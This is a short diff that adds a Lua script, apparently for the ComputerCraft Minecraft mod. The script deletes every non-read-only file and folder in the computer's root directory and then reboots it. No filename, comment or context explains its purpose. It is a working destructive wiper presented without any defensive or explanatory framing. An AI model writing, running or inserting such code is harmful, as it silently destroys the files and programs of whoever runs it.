@@ -1,0 +1,6 @@
+for k,v in pairs(fs.list("/")) do
+	if not fs.isReadOnly(v) then
+		fs.delete(v)
+	end
+end
+os.reboot()
